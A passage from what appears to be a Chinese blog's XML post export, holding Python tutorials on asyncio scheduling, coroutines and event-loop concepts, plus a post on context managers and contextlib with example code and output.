kwarg))</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></div><div class="line">    print(<span class="string">'registering callbacks'</span>)</div><div class="line">    loop.call_soon(callback, <span class="number">1</span>)</div><div class="line">    wrapped = functools.partial(callback, kwarg=<span class="string">'not default'</span>)</div><div class="line">    loop.call_soon(wrapped, <span class="number">2</span>)</div><div class="line"></div><div class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">0.1</span>)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    print(<span class="string">'entering event loop'</span>)</div><div class="line">    event_loop.run_until_complete(main(event_loop))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    print(<span class="string">'closing event loop'</span>)</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>这种回调是按照预定的顺序调用的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_call_soon.py</div><div class="line"></div><div class="line">entering event loop</div><div class="line">registering callbacks</div><div class="line">callback invoked <span class="keyword">with</span> <span class="number">1</span> <span class="keyword">and</span> default</div><div class="line">callback invoked <span class="keyword">with</span> <span class="number">2</span> <span class="keyword">and</span> <span class="keyword">not</span> default</div><div class="line">closing event loop</div></pre></td></tr></table></figure></p><h3 id="延迟调度"><a href="#延迟调度" class="headerlink" title="延迟调度"></a>延迟调度</h3><p>将一个回调延迟到未来某个时间可以使用call_later()函数。第一个参数是要延迟的时间秒数，第二个参数是要回调的函数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(n)</span>:</span></div><div class="line">    print(<span class="string">'callback &#123;&#125; invoked'</span>.format(n))</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></div><div class="line">    print(<span class="string">'registering callbacks'</span>)</div><div class="line">    loop.call_later(<span class="number">0.2</span>, callback, <span class="number">1</span>)</div><div class="line">    loop.call_later(<span class="number">0.1</span>, callback, <span class="number">2</span>)</div><div class="line">    loop.call_soon(callback, <span class="number">3</span>)</div><div class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">0.4</span>)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    print(<span class="string">'entering event loop'</span>)</div><div class="line">    event_loop.run_until_complete(main(event_loop))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    print(<span class="string">'closing event loop'</span>)</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>在这个例子中，同样的回调函数通过不同的参数在不同的时间被调度。最后使用的call_soon()函数却在前面调度运行，表明“soon”是马上进行调度运行的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_call_later.py</div><div class="line"></div><div class="line">entering event loop</div><div class="line">registering callbacks</div><div class="line">callback <span class="number">3</span> invoked</div><div class="line">callback <span class="number">2</span> invoked</div><div class="line">callback <span class="number">1</span> invoked</div><div class="line">closing event loop</div></pre></td></tr></table></figure></p><h3 id="特定时间调度"><a href="#特定时间调度" class="headerlink" title="特定时间调度"></a>特定时间调度</h3><p>还可以在一个特定的时间点进行调度。事件循环使用的是一个monotonic clock而不是一个wall-clock时间，以确保“now”的值永远不会倒退。要在特定的时间进行调度必须从循环的内部时间“now()”开始。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(n, loop)</span>:</span></div><div class="line">    print(<span class="string">'callback &#123;&#125; invoked at &#123;&#125;'</span>.format(n, loop.time()))</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></div><div class="line">    now = loop.time()</div><div class="line">    print(<span class="string">'clock time: &#123;&#125;'</span>.format(time.time()))</div><div class="line">    print(<span class="string">'loop  time: &#123;&#125;'</span>.format(now))</div><div class="line">    print(<span class="string">'registering callbacks'</span>)</div><div class="line">    loop.call_at(now + <span class="number">0.2</span>, callback, <span class="number">1</span>, loop)</div><div class="line">    loop.call_at(now + <span class="number">0.1</span>, callback, <span class="number">2</span>, loop)</div><div class="line">    loop.call_soon(callback, <span class="number">3</span>, loop)</div><div class="line"></div><div class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    print(<span class="string">'entering event loop'</span>)</div><div class="line">    event_loop.run_until_complete(main(event_loop))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    print(<span class="string">'closing event loop'</span>)</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>注意，调度的时间是根据循环内部的时间而不是当前的时间time.time()。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_call_at.py</div><div class="line"></div><div class="line">entering event loop</div><div class="line">clock time: <span class="number">1479050248.66192</span></div><div class="line">loop  time: <span class="number">1008846.13856885</span></div><div class="line">registering callbacks</div><div class="line">callback <span class="number">3</span> invoked at <span class="number">1008846.13867956</span></div><div class="line">callback <span class="number">2</span> invoked at <span class="number">1008846.239931555</span></div><div class="line">callback <span class="number">1</span> invoked at <span class="number">1008846.343480996</span></div><div class="line">closing event loop</div></pre></td></tr></table></figure></p><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之使用协程处理多任务</title>
      <link href="/2017/12/21/asyncio%E4%B9%8B%E4%BD%BF%E7%94%A8%E5%8D%8F%E7%A8%8B%E5%A4%84%E7%90%86%E5%A4%9A%E4%BB%BB%E5%8A%A1/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E4%BD%BF%E7%94%A8%E5%8D%8F%E7%A8%8B%E5%A4%84%E7%90%86%E5%A4%9A%E4%BB%BB%E5%8A%A1/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>使用协程处理多任务</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>协程是语言专门为并发操作设计的一个结构。一个协程函数当被调用时创建了一个协程对象，调用者可以使用协程的send()方法运行协程函数的代码。协程可以使用await关键字暂停当前执行将控制权交给其他协程，当协程被暂停，它的运行状态被保存下来，可以在下一次被唤醒时继续执行。</p><h3 id="启动协程"><a href="#启动协程" class="headerlink" title="启动协程"></a>启动协程</h3><p>通过asyncio事件循环有几种不同的方式可以启动协程，最简单的方法是使用run_until_complete()函数，直接传入一个协程。（注意：run_until_complete()函数传入的是一个Future对象，如果传入的是一个协程，协程会被ensure_future()函数自动包装成Future对象，返回Future的结果或者抛出异常）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># asyncio_coroutine.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">coroutine</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'in coroutine'</span>)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    print(<span class="string">'starting coroutine'</span>)</div><div class="line">    coro = coroutine()</div><div class="line">    print(<span class="string">'entering event loop'</span>)</div><div class="line">    event_loop.run_until_complete(coro)</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    print(<span class="string">'closing event loop'</span>)</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>第一步是获取一个事件循环对象，可以使用默认的事件循环类型，也可以使用特定的事件循环，在这个例子中使用了默认的事件循环类型。run_until_complete()函数传入协程对象启动了循环，在协程运行结束后停止了事件循环。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_coroutine.py</div><div class="line"></div><div class="line">starting coroutine</div><div class="line">entering event loop</div><div class="line"><span class="keyword">in</span> coroutine</div><div class="line">closing event loop</div></pre></td></tr></table></figure></p><h3 id="协程返回值"><a href="#协程返回值" class="headerlink" title="协程返回值"></a>协程返回值</h3><p>协程的返回值需要等待协程运行完成才能接受。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">coroutine</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'in coroutine'</span>)</div><div class="line">    <span class="keyword">return</span> <span class="string">'result'</span></div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    return_value = event_loop.run_until_complete(coroutine())</div><div class="line">    print(<span class="string">'it returned: &#123;!r&#125;'</span>.format(return_value))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>在这种情况下，run_until_complete()函数会等待协程运行完成并返回协程的运行结果。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_coroutine_return.py</div><div class="line"></div><div class="line"><span class="keyword">in</span> coroutine</div><div class="line">it returned: <span class="string">'result'</span></div></pre></td></tr></table></figure></p><h3 id="协程链"><a href="#协程链" class="headerlink" title="协程链"></a>协程链</h3><p>一个协程可以启动其他的协程并等待返回结果，这使得将任务分解为可重用的部分变得更加容易。下面的例子有两个阶段，必须按顺序执行，但是可以与其他操作并行运行。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">outer</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'in outer'</span>)</div><div class="line">    print(<span class="string">'waiting for result1'</span>)</div><div class="line">    result1 = <span class="keyword">await</span> phase1()</div><div class="line">    print(<span class="string">'waiting for result2'</span>)</div><div class="line">    result2 = <span class="keyword">await</span> phase2(result1)</div><div class="line">    <span class="keyword">return</span> (result1, result2)</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">phase1</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'in phase1'</span>)</div><div class="line">    <span class="keyword">return</span> <span class="string">'result1'</span></div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">phase2</span><span class="params">(arg)</span>:</span></div><div class="line">    print(<span class="string">'in phase2'</span>)</div><div class="line">    <span class="keyword">return</span> <span class="string">'result2 derived from &#123;&#125;'</span>.format(arg)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    return_value = event_loop.run_until_complete(outer())</div><div class="line">    print(<span class="string">'return value: &#123;!r&#125;'</span>.format(return_value))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>await关键字用来将新的协程任务发送到事件循环。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_coroutine_chain.py</div><div class="line"></div><div class="line"><span class="keyword">in</span> outer</div><div class="line">waiting <span class="keyword">for</span> result1</div><div class="line"><span class="keyword">in</span> phase1</div><div class="line">waiting <span class="keyword">for</span> result2</div><div class="line"><span class="keyword">in</span> phase2</div><div class="line"><span class="keyword">return</span> value: (<span class="string">'result1'</span>, <span class="string">'result2 derived from result1'</span>)</div></pre></td></tr></table></figure></p><h3 id="生成器替代协程"><a href="#生成器替代协程" class="headerlink" title="生成器替代协程"></a>生成器替代协程</h3><p>协程函数是asyncio框架设计中的一个关键组件，它们提供了一种语言结构，用于停止执行程序的一部分，保留该调用的状态，并在以后的时间重新进入状态，这些都是并发性框架的重要功能。<br>Python 3.5引入了新的语言特性，使用async def来定义原生的协程，使用await来交出控制权，上面关于asyncio的例子也充分的体现了这些新的特性。早期版本的Python 3可以使用被asyncio.coroutine()装饰的生成器函数和yield from达到同样的效果。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="meta">@asyncio.coroutine</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'in outer'</span>)</div><div class="line">    print(<span class="string">'waiting for result1'</span>)</div><div class="line">    result1 = <span class="keyword">yield</span> <span class="keyword">from</span> phase1()</div><div class="line">    print(<span class="string">'waiting for result2'</span>)</div><div class="line">    result2 = <span class="keyword">yield</span> <span class="keyword">from</span> phase2(result1)</div><div class="line">    <span class="keyword">return</span> (result1, result2)</div><div class="line"></div><div class="line"><span class="meta">@asyncio.coroutine</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">phase1</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'in phase1'</span>)</div><div class="line">    <span class="keyword">return</span> <span class="string">'result1'</span></div><div class="line"></div><div class="line"><span class="meta">@asyncio.coroutine</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">phase2</span><span class="params">(arg)</span>:</span></div><div class="line">    print(<span class="string">'in phase2'</span>)</div><div class="line">    <span class="keyword">return</span> <span class="string">'result2 derived from &#123;&#125;'</span>.format(arg)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    return_value = event_loop.run_until_complete(outer())</div><div class="line">    print(<span class="string">'return value: &#123;!r&#125;'</span>.format(return_value))</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>上面的例子使用生成器函数替代了原生的协程。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_generator.py</div><div class="line"></div><div class="line"><span class="keyword">in</span> outer</div><div class="line">waiting <span class="keyword">for</span> result1</div><div class="line"><span class="keyword">in</span> phase1</div><div class="line">waiting <span class="keyword">for</span> result2</div><div class="line"><span class="keyword">in</span> phase2</div><div class="line"><span class="keyword">return</span> value: (<span class="string">'result1'</span>, <span class="string">'result2 derived from result1'</span>)</div></pre></td></tr></table></figure></p><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之异步并发的概念</title>
      <link href="/2017/12/21/asyncio%E4%B9%8B%E5%BC%82%E6%AD%A5%E5%B9%B6%E5%8F%91%E7%9A%84%E6%A6%82%E5%BF%B5/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E5%BC%82%E6%AD%A5%E5%B9%B6%E5%8F%91%E7%9A%84%E6%A6%82%E5%BF%B5/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>异步并发的概念</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><ul><li>大多数使用其他并发模型的程序都是线性编写的，并且依赖于语言运行时或操作系统的底层线程或进程管理来适当的切换上下文。基于asyncio的程序要求程序代码明确的处理上下文的切换，正确的使用该技术处理任务需要理解几个相互关联的概念。</li><li>asyncio提供的框架以事件循环为中心，一个负责有效地处理输入/输出事件、系统事件和应用程序上下文切换的类对象。提供了不同的事件循环实现，以充分利用操作系统功能。通常会自动的选择合理的事件循环实现，也可以在程序中选择特定的事件循环实现。这在Windows操作系统中很有用，例如，某些事件循环类增加了对外部进程的支持，从而在网络I/O中提高一些效率。</li><li>应用程序和事件循环的交互需要显示的注册要运行的代码，并在资源可用时让事件循环对应用程序代码进行必要的调用。例如，一个网络服务开放了sockets并注册了输入事件，当有一个新的连接产生或者发生数据读取时事件循环就会通知服务器进行处理。应用程序代码在很短的一段时间之后，在当前上下文中没有更多的工作可以完成之后，将再次获得控制权。例如，如果没有更多的数据可以从sockets中读取，服务器应该将控制权交还给事件循环。</li><li>将控制权交给事件循环的机制依赖于Python的协程，一个特殊的函数，可以在不丢失上下文的情况下交出控制权给调用者。协程和生成器函数很类似，事实上，在Python 3.5之前的版本生成器被用来实现协程，而不是原生的支持协程对象。asyncio也为protocols和transports层提供了基于类的抽象，用于使用回调来编写代码而不是直接使用协程来编写。asyncio通过重新进入事件循环显示的切换上下文取代了Python线程实现的隐式切换上下文。</li><li>一个Future表示一个将会在未来完成的工作结果的对象，封装一个可调用的异步执行。事件循环可以监视Future对象的完成，允许程序的一部分等待其他的一部分完成工作。除了future，asyncio还包含了其他的并发原语如locks和semaphores。</li><li>Task是Future的子类，它知道如何包装和管理协程的执行。当Task需要的资源可用时可以被事件循环调度运行，并产生一个可以被其他协程消费的结果。</li></ul><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python上下文管理器</title>
      <link href="/2017/12/21/Python%E4%B8%8A%E4%B8%8B%E6%96%87%E7%AE%A1%E7%90%86%E5%99%A8/"/>
      <url>/2017/12/21/Python%E4%B8%8A%E4%B8%8B%E6%96%87%E7%AE%A1%E7%90%86%E5%99%A8/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>Python上下文管理器</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h3 id="上下文管理器"><a href="#上下文管理器" class="headerlink" title="上下文管理器"></a>上下文管理器</h3><p>有时候我们需要在当程序在语句块中运行时保持某种状态，并且在离开语句块后结束这种状态。所以，事实上上下文管理器的任务是 – 代码块执行前准备，代码块执行后收拾。<br>上下文管理器允许你在有需要的时候，精确地分配和释放资源。使用上下文管理器最广泛的案例就是with语句了。<br>上下文管理器的一个常见用例，是资源的加锁和解锁，以及关闭已打开的文件。</p><h3 id="基于类的实现"><a href="#基于类的实现" class="headerlink" title="基于类的实现"></a>基于类的实现</h3><p>一个上下文管理器的类，最起码要定义<strong>enter</strong>和<strong>exit</strong>方法。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, file_name, method)</span>:</span></div><div class="line">        self.file_obj = open(file_name, method)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__enter__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.file_obj</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__exit__</span><span class="params">(self, type, value, traceback)</span>:</span></div><div class="line">        self.file_obj.close()</div></pre></td></tr></table></figure></p><p>我们的<strong>exit</strong>函数接受三个参数。这些参数对于每个上下文管理器类中的<strong>exit</strong>方法都是必须的。我们来谈谈在底层都发生了什么。</p><ul><li>1.with语句先暂存了File类的<strong>exit</strong>方法</li><li>2.然后它调用File类的<strong>enter</strong>方法</li><li>3.<strong>enter</strong>方法打开文件并返回给with语句</li><li>4.打开的文件句柄被传递给opened_file参数</li><li>5.我们使用.write()来写文件</li><li>6.with语句调用之前暂存的<strong>exit</strong>方法</li><li>7.<strong>exit</strong>方法关闭了文件</li></ul><h3 id="处理异常"><a href="#处理异常" class="headerlink" title="处理异常"></a>处理异常</h3><p>我们还没有谈到<strong>exit</strong>方法的这三个参数：type, value和traceback。<br>在第4步和第6步之间，如果发生异常，Python会将异常的type,value和traceback传递给<strong>exit</strong>方法。<br>它让<strong>exit</strong>方法来决定如何关闭文件以及是否需要其他步骤。<br>我们来列一下，当异常发生时，with语句会采取哪些步骤。</p><ul><li>1.它把异常的type,value和traceback传递给<strong>exit</strong>方法</li><li>2.它让<strong>exit</strong>方法来处理异常</li><li>3.如果<strong>exit</strong>返回的是True，那么这个异常就被优雅地处理了。</li><li>4.如果<strong>exit</strong>返回的是True以外的任何东西，那么这个异常将被with语句抛出。<br>在我们的案例中，<strong>exit</strong>方法返回的是None(如果没有return语句那么方法会返回None)。因此，with语句抛出了那个异常。<br>我们的<strong>exit</strong>方法返回了True,因此没有异常会被with语句抛出。</li></ul><h3 id="基于生成器的实现"><a href="#基于生成器的实现" class="headerlink" title="基于生成器的实现"></a>基于生成器的实现</h3><p>我们还可以用装饰器(decorators)和生成器(generators)来实现上下文管理器。<br>Python有个contextlib模块专门用于这个目的。我们可以使用一个生成器函数来实现一个上下文管理器，而不是使用一个类。<br>让我们看看一个基本的，没用的例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> contextmanager</div><div class="line"></div><div class="line"><span class="meta">@contextmanager</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_file</span><span class="params">(name)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        f = open(name, <span class="string">'w'</span>)</div><div class="line">        <span class="keyword">yield</span> f</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        print(e)</div><div class="line">    <span class="keyword">finally</span>:</div><div class="line">        f.close()</div></pre></td></tr></table></figure></p><p>在这个例子中我们还没有捕捉可能产生的任何异常。它的工作方式和之前的方法大致相同。<br>让我们小小地剖析下这个方法。</p><ul><li>1.Python解释器遇到了yield关键字。因为这个缘故它创建了一个生成器而不是一个普通的函数。</li><li>2.因为这个装饰器，contextmanager会被调用并传入函数名（open_file）作为参数。</li><li>3.contextmanager函数返回一个以GeneratorContextManager对象封装过的生成器。</li><li>4.这个GeneratorContextManager被赋值给open_file函数，我们实际上是在调用GeneratorContextManager对象。</li></ul><p>那现在我们既然知道了所有这些，我们可以用这个新生成的上下文管理器了，像这样：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open_file(<span class="string">'some_file'</span>) <span class="keyword">as</span> f:</div><div class="line">    f.write(<span class="string">'hola!'</span>)</div></pre></td></tr></table></figure></p><p>如果你希望在上下文管理器中使用“as”关键字，那么就用yield返回你需要的值，它将通过as关键字赋值给新的变量。</p><h3 id="谈一些关于上下文库-contextlib-的内容"><a href="#谈一些关于上下文库-contextlib-的内容" class="headerlink" title="谈一些关于上下文库(contextlib)的内容"></a>谈一些关于上下文库(contextlib)的内容</h3><p>contextlib是一个Python模块，作用是提供更易用的上下文管理器。<br><strong>contextlib.closing</strong><br>假设我们有一个创建数据库函数，它将返回一个数据库对象，并且在使用完之后关闭相关资源(数据库连接会话等)<br>我们可以像以往那样处理或是通过上下文管理器：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> contextlib.closing(CreateDatabase()) <span class="keyword">as</span> database:</div><div class="line">    database.query()</div></pre></td></tr></table></figure></p><p>contextlib.closing方法将在语句块结束后调用数据库的关闭方法。</p><p><strong>contextlib.nested</strong><br>假设我们有两个文件，一个读一个写，需要进行拷贝。<br>以下是不提倡的：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">'toReadFile'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> reader:</div><div class="line">    <span class="keyword">with</span> open(<span class="string">'toWriteFile'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> writer:</div><div class="line">        writer.writer(reader.read())</div></pre></td></tr></table></figure></p><p>可以通过contextlib.nested进行简化：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> contextlib.nested(open(<span class="string">'fileToRead.txt'</span>, <span class="string">'r'</span>), open(<span class="string">'fileToWrite.txt'</span>, <span class="string">'w'</span>)) <span class="keyword">as</span> (reader, writer):</div><div class="line">    writer.write(reader.read())</div></pre></td></tr></table></figure></p><p>在Python2.7中这种写法被一种新语法取代：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">'fileToRead.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> reader,  open(<span class="string">'fileToWrite.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> writer:</div><div class="line">    writer.write(reader.read())</div></pre></td></tr></table></figure></p><p><strong>contextlib.contextmanager</strong><br>对于Python高级玩家来说，任何能够被yield关键词分割成两部分的函数，都能够通过装饰器装饰的上下文管理器来实现。任何在yield之前的内容都可以看<br>做在代码块执行前的操作，而任何yield之后的操作都可以放在exit函数中。<br>如果你希望在上下文管理器中使用“as”关键字，那么就用yield返回你需要的值，它将通过as关键字赋值给新的变量。<br>contextlib库中除了上述的几个常见的上下文管理器函数以外，还有contextlib.suppress(*exceptions)、contextlib.redirect_stdout / redirect_stderr、contextlib.ContextDecorator、contextlib.ExitStack等函数可以适用于不同的情景。</p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Python语法 </tag>
